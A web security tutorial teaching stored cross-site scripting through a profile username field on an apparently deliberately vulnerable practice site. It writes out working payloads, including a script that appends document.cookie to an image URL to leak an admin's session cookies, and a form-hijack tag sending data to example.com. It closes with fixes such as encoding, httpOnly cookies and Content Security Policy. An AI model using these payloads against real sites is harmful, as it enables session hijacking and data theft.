# HTML Injection, part 2

If someone was to create an account with the username "evil" and the password "666".

Then changed their username to:

	evil<script>alert('hi')</script>

And then got the admin to look at their profile (username "admin", password "password")... what would happen?

Now, could this do something more evil.

Maybe there are some cookies to be stolen?

---

To build up an example, try setting the username to:

	evil<script>alert(document.cookie)</script>

Then click back and refresh the page.

Now try creating an image with JavaScript:

	evil<script>document.write('<img src=/security/uploads/profile-pictures/1.jpg />');</script>

Now try combining the two together:

	evil<script>document.write('<img src=/security/uploads/profile-pictures/1.jpg?c='+encodeURIComponent(document.cookie)+' />');</script>

So after refreshing the page, you will see that the image is requested with the cookies appended to the end.

Now imagine what would happen if the image source pointed to an image on an evil website, and that evil website sent back a 1x1 px transparent GIF (or something more malicious).

To fix...

As before, you should encode all user supplied values on the page.

You can also try to limit the amount of damage that can be done - for example, cookies can be marked as `httpOnly`, which means JavaScript itself cannot steal whats stored in them (if JavaScript makes requests to your website, e.g. via XMLHttpRequest, then these cookies are still included).

And you can look at adding a [Content Security Policy](https://developers.google.com/web/fundamentals/security/csp/) - this is a really nice way to stop requests being made out to evil websites.

It's also a good idea to not use any inline JavaScript or Styles, and get the Content Security Policy to enforce this. There are cases where this can be tricky, but it's not impossible.

Bonus problem...

What happens if the username is set to:

	evil<form action=https://example.com>

Now go back, and try making another change, and see where the form is sent to :-)

You will also notice that the full URL contains all of the details that were in that form.
